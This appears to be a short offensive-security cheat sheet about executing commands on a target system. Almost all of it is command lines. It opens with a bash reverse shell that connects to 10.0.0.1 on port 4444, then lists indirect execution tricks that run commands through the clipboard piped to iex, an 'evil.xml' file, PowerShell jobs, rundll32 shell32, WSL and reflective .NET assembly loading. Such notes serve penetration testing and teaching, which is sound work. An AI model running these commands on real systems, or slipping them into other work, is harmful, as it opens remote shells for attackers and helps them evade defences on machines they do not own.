# Execution via System Commands

We may execute system commands in a target system.

## Basic Commands

```powershell
bash -c "echo hello"
bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
```

## Indirect Execution

- via Clipboard

    ```powershell
    echo whoami | clip # Copy "whoami" string to clipboard
    Get-Clipboard | iex # Execute the content of clipboard
    ```

- via XML

    ```powershell
    "whoami" | Export-clixml evil.xml # Write "whoami" to XML file
    iex $(Import-Clixml evil.xml) # Execute the cotent of the XML file
    ```

- via Job

    ```powershell
    $Job = Start-Job {Write-Host "Hello!"} # Start new job
    Wait-Job -Job $Job
    Receive-Job -Job $Job # Receive the result of the job
    Remove-Job -Job $Job # Remove the job
    ```

- via Shell32

    This command executes `whoami` and write the result to `result.txt`. This command does not write the result in terminal, so we need to write the text file.

    ```powershell
    rundll32 shell32.dll,ShellExec_RunDLL "cmd.exe" "/c whoami > result.txt"
    ```

- via WSL

    This command is executed via WSL. Note that WSL must be enabled in a target system.

    ```powershell
    wsl cmd.exe /c whoami
    ```

## Executing C#

```powershell
iex '[System.Reflection.Assembly]::Load("System.Windows.Forms");[System.Windows.Forms.MessageBox]::Show("Hello world")'
```